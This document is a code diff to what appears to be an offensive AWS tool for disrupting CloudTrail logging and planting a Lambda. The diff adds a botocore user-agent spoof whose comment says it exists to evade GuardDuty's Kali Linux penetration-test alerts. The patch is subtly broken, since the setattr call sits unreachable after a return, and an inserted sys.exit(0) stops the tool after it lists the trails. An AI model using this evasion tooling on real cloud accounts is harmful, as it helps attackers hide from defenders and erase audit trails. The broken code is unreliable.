@@ -36,6 +36,7 @@
 #
 # Requirements:
 #   - boto3
+#   - pytest
 #
 # Author: Mariusz B. / mgeeky '19, <mb@binary-offensive.com>
 #
@@ -469,11 +470,37 @@ def parseOptions(argv):
 
     return args
 
+def monkeyPatchBotocoreUserAgent():
+    '''
+    This is to avoid triggering GuardDuty 'PenTest:IAMUser/KaliLinux' alerts
+    Source:
+      https://www.thesubtlety.com/post/patching-boto3-useragent/
+    
+    '''
+    import sys
+    import boto3
+    import botocore
+
+    try:
+        from _pytest.monkeypatch import MonkeyPatch
+    except (ImportError, ModuleNotFoundError) as e:
+        print('[!] Please install "pytest" first: pip3 install pytest')
+        print('\tthis will be used to patch-up boto3 library to avoid GuardDuty Kali detection')
+        sys.exit(0)
+
+    monkeypatch = MonkeyPatch()
+    def my_user_agent(self):
+        return "Boto3/1.9.89 Python/2.7.12 Linux/4.2.0-42-generic"
+
+        monkeypatch.setattr(botocore.session.Session, 'user_agent', my_user_agent)
+
 def main(argv):
     opts = parseOptions(argv)
     if not opts:
         Logger.err('Options parsing failed.')
         return False
+
+    monkeyPatchBotocoreUserAgent()
 
     dis = CloudTrailDisruptor(
         config['region'], 
@@ -499,6 +526,8 @@ def main(argv):
     Logger.info('Trails intended to be disrupted:')
     for trail in trails:
         Logger._out(f'\t- {trail["Name"]}')
+
+    sys.exit(0)
 
     Logger._out('')
     Logger.info('Step 2: Create a role to be assumed by planted Lambda')
